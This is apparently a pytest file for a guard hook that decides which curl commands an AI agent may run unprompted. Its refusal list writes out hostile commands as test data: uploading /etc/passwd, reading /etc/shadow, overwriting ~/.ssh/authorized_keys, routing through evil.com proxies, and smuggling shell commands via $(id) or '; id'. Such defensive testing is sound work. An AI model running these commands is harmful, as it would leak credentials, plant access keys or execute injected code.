"""tests/hooks/allow-safe-curl.test.js, case for case."""

import string

import pytest

from claude_guard.checks import curl
from claude_guard.checks.curl import curl_safe

ALLOW = [
    "curl http://10.0.0.161:9090/metrics",
    "curl http://10.0.0.139/api",
    "curl https://10.0.0.215/",
    "curl http://localhost:8080/health",
    "curl http://127.0.0.1:8000/",
    'curl "http://[::1]:3000/x"',
    "curl HTTP://10.0.0.161/x",
    "curl http://LOCALHOST:8080/",
    "/usr/bin/curl -fsS http://127.0.0.1:8000/",
    "curl -sS http://localhost:8080/health",
    "curl -I https://10.0.0.215/",
    "curl -k https://10.0.0.161:8443/health",
    'curl -X GET -H "Accept: application/json" http://10.0.0.139/api',
    'curl -H"X-Token: 1" http://10.0.0.161/y',
    "curl --max-time=5 http://10.0.0.161/y",
    "curl -s --compressed --retry 3 http://10.0.0.161/y",
    'curl --url "http://10.0.0.161/x" -m 5',
    'curl "http://10.0.0.161:9090/api/v1/query?query=up&step=5m"',
    "curl 'http://10.0.0.161/a?b=1&c=2'",
    "curl http://10.43.39.218:9090/api/v1/query",
    "curl http://10.42.0.171:3000/health",
    "curl https://prometheus-k8s.local.daniel-hunter.com/api/v1/query",
    "curl -sS https://jellyfin.daniel-hunter.com/health",
    'curl -s -G http://127.0.0.1:9090/api/v1/query --data-urlencode "query=up"',
    'curl -sG --data-urlencode "query=up" http://10.43.39.218:9090/api/v1/query',
    'curl -s --get --data-urlencode "query=up" http://127.0.0.1:9090/api/v1/query',
    'curl -sS -w "%{http_code}" https://homepage.daniel-hunter.com/',
    'curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:9090/-/ready',
    'curl -so /dev/null -w "homepage=%{http_code}" https://homepage.daniel-hunter.com/',
    'curl --output /dev/null -w "%{http_code}" http://10.43.39.218:9090/-/ready',
    'curl --output=/dev/null -w "%{http_code}" http://127.0.0.1:9090/-/ready',
    'curl -s -o /dev/null -w "%{http_code}\\n" http://127.0.0.1:9090/-/ready',
    'curl -so /dev/null -w "homepage=%{http_code}\\n" https://homepage.daniel-hunter.com/',
    'curl -H "X-Literal: \\$HOME" http://10.0.0.161/x',
    'curl -w "\\`literal\\`" http://10.0.0.161/x',
]

DEFER = [
    "curl http://daniel-hunter.com.attacker.net/x",
    "curl http://evil-daniel-hunter.com/x",
    "curl http://notdaniel-hunter.com/x",
    "curl https://prometheus-k8s.local.daniel-hunter.com.evil.net/x",
    "curl http://10.43.39.218.evil.com/x",
    "curl http://10.44.0.1/x",
    "curl http://10.43.999.1/x",
    "curl http://10.43.0/x",
    'curl --data-urlencode "query=up" http://127.0.0.1:9090/api/v1/query',
    'curl -X POST --data-urlencode "q=1" http://127.0.0.1:9090/x',
    "curl -G --data-urlencode @/etc/passwd http://127.0.0.1:9090/x",
    "curl -o /home/ubuntu/.ssh/authorized_keys https://prometheus-k8s.local.daniel-hunter.com/x",
    "curl -o /tmp/x http://127.0.0.1:9090/metrics",
    "curl -so/tmp/x http://127.0.0.1:9090/metrics",
    "curl --output /tmp/x http://127.0.0.1:9090/metrics",
    "curl --output=/tmp/x http://127.0.0.1:9090/metrics",
    "curl -o /dev/null/../../tmp/x http://127.0.0.1:9090/metrics",
    'curl -o "/dev/null x" http://127.0.0.1:9090/metrics',
    "curl -O http://127.0.0.1:9090/metrics",
    "curl --output-dir /tmp -o /dev/null http://127.0.0.1:9090/metrics",
    'curl -H "X-Sub: $(whoami)" http://10.0.0.161/x',
    'curl -w "`whoami`" http://10.0.0.161/x',
    'curl "http://10.0.0.161/$PATH"',
    'curl "http://10.0.0.161/x\\"',
    'curl "http://10.0.0.161/x\\" -o /tmp/y',
    'curl "http://10.0.0.161/x\\\\" -o /tmp/y',
    'curl "http://10.0.0.161\\@evil.com/x"',
    "curl -L https://prometheus-k8s.local.daniel-hunter.com/x",
    "curl http://evil.com/x",
    "curl http://10.0.0.1610/x",
    "curl http://10.0.0.161.evil.com/x",
    "curl http://evil.com/10.0.0.161",
    "curl http://10.0.0.161@evil.com/x",
    "curl http://127.0.0.2/x",
    "curl http://10.0.0.16/x",
    "curl http://10.0.0.161:notaport/x",
    "curl http://10.0.0.161/x http://evil.com/y",
    "curl --url http://evil.com/x",
    "curl --url=http://evil.com/x",
    "curl file:///etc/shadow",
    "curl dict://10.0.0.161/x",
    "curl gopher://10.0.0.161/x",
    "curl -L http://10.0.0.161/x",
    "curl --location http://10.0.0.161/x",
    "curl --resolve 10.0.0.161:80:1.2.3.4 http://10.0.0.161/x",
    "curl --connect-to 10.0.0.161:80:evil.com:80 http://10.0.0.161/x",
    "curl -x http://evil.com http://10.0.0.161/x",
    "curl --proxy http://evil.com http://10.0.0.161/x",
    "curl --unix-socket /var/run/docker.sock http://localhost/containers/json",
    "curl -K /tmp/cfg http://10.0.0.161/x",
    "curl --config /tmp/cfg http://10.0.0.161/x",
    "curl http://10.0.0.161/x --next http://evil.com/y",
    "curl -o /tmp/x http://10.0.0.161/x",
    "curl -O http://10.0.0.161/x",
    "curl -sSo /tmp/x http://10.0.0.161/x",
    "curl --output-dir /tmp -O http://10.0.0.161/x",
    "curl --create-dirs -o /tmp/a/b http://10.0.0.161/x",
    "curl -D /tmp/h http://10.0.0.161/x",
    "curl --trace-ascii /tmp/t http://10.0.0.161/x",
    "curl --stderr /tmp/e http://10.0.0.161/x",
    'curl "http://10.0.0.161/x" "http://10.0.0.161/y" -o out',
    "curl -T /etc/passwd http://10.0.0.161/x",
    "curl -F file=@/etc/passwd http://10.0.0.161/x",
    "curl -d @/etc/passwd http://10.0.0.161/x",
    "curl --data-binary @/etc/passwd http://10.0.0.161/x",
    "curl -H @/etc/shadow http://10.0.0.161/x",
    "curl -w @/tmp/f http://10.0.0.161/x",
    "curl -b /etc/passwd http://10.0.0.161/x",
    "curl -u admin:pw http://10.0.0.161/x",
    "curl -X POST http://10.0.0.161/x",
    "curl -X DELETE http://10.0.0.161/x",
    "curl --request PUT http://10.0.0.161/x",
    "curl --request=POST http://10.0.0.161/x",
    "curl --zzz-unknown http://10.0.0.161/x",
    "curl -Z http://10.0.0.161/x",
    "curl -- http://10.0.0.161/x",
    "curl -m",
    "curl --header",
    "curl --header http://10.0.0.161/x",
    "curl http://10.0.0.161/x; id",
    'curl "http://10.0.0.161/x" && id',
    "curl http://10.0.0.161/x | tee /etc/passwd",
    "curl http://10.0.0.161/x > /etc/passwd",
    "curl http://10.0.0.161/x & id",
    "curl http://10.0.0.161/x\nid",
    "curl $URL",
    'curl "http://10.0.0.161/${HOME}"',
    'curl "http://10.0.0.161/$(id)"',
    "curl http://10.0.0.161/`id`",
    "curl http://10.0.0.161/a*",
    "curl http://[::1]:3000/x",
    "curl ~/x",
    'curl "http://10.0.0.161/x',
    "curl",
    "curl -sS",
    "curlie http://10.0.0.161/x",
    "env curl http://10.0.0.161/x",
    "sudo curl http://10.0.0.161/x",
    "wget http://10.0.0.161/x",
    "",
]


@pytest.mark.parametrize("command", ALLOW)
def test_a_plain_get_or_head_against_an_allowlisted_host_is_allowed(command):
    assert curl_safe(command) is True


@pytest.mark.parametrize("command", DEFER)
def test_any_other_host_option_or_method_is_refused(command):
    assert curl_safe(command) is False


INVENTED = [
    "--a",
    "--zz",
    "--out",
    "--data-raw",
    "--upload",
    "--socks5",
    "--proxy1.0",
    "--cert",
    "--engine",
    "--dump-header",
    "--remote-name",
    "--location-trusted",
    "--config-file",
    "--form-string",
    "--netrc-file",
]


@pytest.mark.parametrize("opt", INVENTED)
def test_an_unnamed_long_option_is_refused(opt):
    assert curl_safe(f"curl {opt} http://10.0.0.161/x") is False


@pytest.mark.parametrize(
    "c", [c for c in string.ascii_letters if c not in curl.BOOL_SHORT + curl.VALUE_SHORT]
)
def test_an_unnamed_short_option_is_refused(c):
    assert curl_safe(f"curl -{c} http://10.0.0.161/x") is False


def test_the_option_tables_stay_an_allowlist():
    shorts = curl.BOOL_SHORT + curl.VALUE_SHORT
    for c in "LOJdFTKbux":
        assert c not in shorts, c
    longs = curl.LONG_BOOL | curl.LONG_VALUE
    for opt in [
        "location",
        "location-trusted",
        "resolve",
        "connect-to",
        "proxy",
        "preproxy",
        "unix-socket",
        "abstract-unix-socket",
        "config",
        "next",
        "output-dir",
        "remote-name",
        "remote-header-name",
        "create-dirs",
        "dump-header",
        "trace",
        "trace-ascii",
        "stderr",
        "upload-file",
        "data",
        "data-binary",
        "data-raw",
        "form",
        "form-string",
        "cookie",
        "cookie-jar",
        "user",
        "netrc",
        "netrc-file",
    ]:
        assert opt not in longs, opt
    # -o/--output is the ONE write primitive admitted, pinned to /dev/null.
    # (allow-safe-curl.sh:249-251)
    assert "o" in shorts and "output" in curl.LONG_VALUE
    assert curl_safe("curl -o /dev/null http://10.0.0.161/x") is True
    assert curl_safe("curl -o /dev/nul http://10.0.0.161/x") is False


def test_allow_needs_a_checked_url_not_just_clean_options():
    assert curl_safe("curl -sS") is False
    assert curl_safe("curl -sS -m 5") is False
